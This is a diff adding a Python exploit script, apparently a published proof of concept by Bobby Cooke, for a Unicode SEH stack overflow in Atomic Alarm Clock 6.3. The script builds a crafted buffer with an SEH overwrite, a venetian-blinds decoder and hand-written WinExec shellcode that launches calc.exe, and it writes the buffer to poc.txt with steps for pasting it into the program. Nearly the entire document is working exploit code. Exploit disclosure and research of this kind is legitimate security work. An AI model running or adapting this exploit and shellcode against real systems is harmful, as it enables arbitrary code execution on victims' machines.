@@ -1,0 +1,97 @@
+# Exploit Title: Atomic Alarm Clock 6.3 - Stack Overflow (Unicode+SEH)
+# Exploit Author: Bobby Cooke
+# Date: 2020-04-17
+# Vendor: Drive Software Company
+# Vendor Site: http://www.drive-software.com
+# Software Download: http://www.drive-software.com/download/ataclock.exe
+# Tested On: Windows 10 - Pro 1909 (x86)
+# Version: Atomic Alarm Clock 6.3 beta
+# Recreate: Install > Open > Run Exploit > Open poc.txt & copy to clipboard > Time Zones > Clock1 > click 'Enter display name' textbox > paste buffer
+
+File    = 'poc.txt'
+
+os_nSEH = '\x41'*(461)
+nSEH    = '\xeb\x05'   # jmp short +2
+SEH     = '\x47\x47'   # 0x00470047 : pop esi # pop ebx # ret [AtomicAlarmClock.exe] 
+#{PAGE_EXECUTE_READ} ASLR: False, Rebase: False, SafeSEH: False 
+
+getPC   = '\x73'   # add [ebx], dh   # nop | [EBX] = writable memory 
+getPC  += '\x61'   # popad           # [ESP] = &Payload
+getPC  += '\x72'   # add [edx], dh   # realigns execution for 1 byte opcodes
+
+ebx2eax  = '\x58'  # pop eax         # EAX = &Payload
+ebx2eax += '\x72'  # add [edx], dh
+
+# Ajust EAX to &Decoder
+getDecoder  = '\x05\x13\x11' # add eax, 0x11001300 # EAX + 512-bytes
+getDecoder += '\x72'         # add [edx], dh
+getDecoder += '\x2D\x11\x11' # sub eax, 0x11001100 # EAX = &Decoder
+getDecoder += '\x72'         # add [edx], dh
+getDecoder += '\x50'         # push eax            # [ESP] = &Decoder
+getDecoder += '\x72'         # add [edx], dh
+
+#DecoderHex  = '505F4733D233C966B9100433DB424232DB021C10203F301F47497402EBED50C3' 
+firstHalf   = '\x50\x47\xD2\xC9\xB9\x04\xDB\x42\xDB\x1C\x20\x30\x47\x74\xEB\x50' 
+## 2nd byte - \x00 => \x5F
+venBlinds   = '\x40\x72\xC6\x5F\x72\x40\x72\x40\x72'         
+## 4th byte - \x00 => \x33
+venBlinds  += '\xC6\x33\x72\x40\x72\x40\x72'         
+## 6th byte - \x00 => \x33
+venBlinds  += '\xC6\x33\x72\x40\x72\x40\x72'         
+## 8th byte - \x00 => \x66
+venBlinds  += '\xC6\x66\x72\x40\x72\x40\x72'         
+## 10th byte - \x00 => \x10
+venBlinds  += '\xC6\x10\x72\x40\x72\x40\x72'         
+## 12th byte - \x00 => \x33
+venBlinds  += '\xC6\x33\x72\x40\x72\x40\x72'         
+## 14th byte - \x00 => \x42
+venBlinds  += '\xC6\x42\x72\x40\x72\x40\x72'         
+## 16th byte - \x00 => \x32
+venBlinds  += '\xC6\x32\x72\x40\x72\x40\x72'         
+## 18th byte - \x00 => \x02
+venBlinds  += '\xC6\x02\x72\x40\x72\x40\x72'         
+## 20th byte - \x00 => \x10
+venBlinds  += '\xC6\x10\x72\x40\x72\x40\x72'         
+## 22nd byte - \x00 => \x3F
+venBlinds  += '\xC6\x3F\x72\x40\x72\x40\x72'         
+## 24nd byte - \x00 => \x1F
+venBlinds  += '\xC6\x1F\x72\x40\x72\x40\x72'         
+## 26th byte - \x00 => \x49
+venBlinds  += '\xC6\x49\x72\x40\x72\x40\x72'         
+## 28th byte - \x00 => \x02
+venBlinds  += '\xC6\x02\x72\x40\x72\x40\x72'         
+## 30th byte - \x00 => \xED
+venBlinds  += '\xC6\xED\x72\x40\x72\x40\x72'         
+## 32nd byte - \x00 => \xC3
+venBlinds  += '\xC6\xC3\x72\x40\x72'         
+# Jump to the decoded decoder by Returning to the address we saved on the stack
+venBlinds  += '\xC3'         #   ret  [!] Now we are executing the decoder!
+
+os_decoder   = '\x90'*((512/2)-len(nSEH+SEH+getPC+ebx2eax+getDecoder+venBlinds))
+
+# Custom PopCalc shellcode that avoids the bad characters
+fKernel32  = '\x33\xF6\xF7\xE6\x64\x03\x52\x30\x03\x42\x0C\x03\x70\x1C\xAD\x50\x5E\xAD\xFF\x70\x08'
+
+gExpotTbl  = '\x33\xC9\x33\xF6\x33\xDB\xF7\xE3\x58\x50\x03\x70\x3C\x03\xF0\x03\x56\x78\x03\xD0\x03\x5A\x20\x03\xD8\x03\x4A\x24\x03\xC8\x51\x33\xFF\x03\x7A\x1C\x03\xF8\x57'
+
+fWinExec   = '\x68\x57\x69\x6E\x45\x33\xC0\x33\xF6\x03\xF4\xFC\x50\x33\xC9\x41\x41\x41\x41\xF7\xE1\x33\xFF\x03\x3C\x18\x58\x03\x7C\x24\x0C\xF3\xA6\x74\x03\x40\xEB\xE1\x33\xC9\x41\x41\xF7\xE1\x33\xC9\x03\x4C\x24\x08\x03\xC8\x33\xC0\x66\x03\x01\x33\xC9\x41\x41\x41\x41\xF7\xE1\xFF\x74\x24\x04\x01\x04\x24\x5A\x33\xDB\x03\x1A\x03\x5C\x24\x0C'
+
+# Call WinExec( CmdLine, ShowState );
+#   CmdLine   = "calc.exe"
+#   ShowState = 0x00000001 = SW_SHOWNORMAL - displays a window
+callWinExec  = '\x33\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x33\xC0\x03\xC4\x41\x51\x50\xFF\xD3'
+
+shellcode = fKernel32+gExpotTbl+fWinExec+callWinExec
+
+buffer      = os_nSEH+nSEH+SEH+getPC+ebx2eax+getDecoder+venBlinds+os_decoder+firstHalf+shellcode
+filler      = '\x77'*(9000-len(buffer))
+buffer      = buffer+filler
+
+try:
+    payload   = buffer
+    f         = open(File, 'w')
+    f.write(payload)
+    f.close()
+    print File + " created successfully"
+except:
+    print File + ' failed to create'
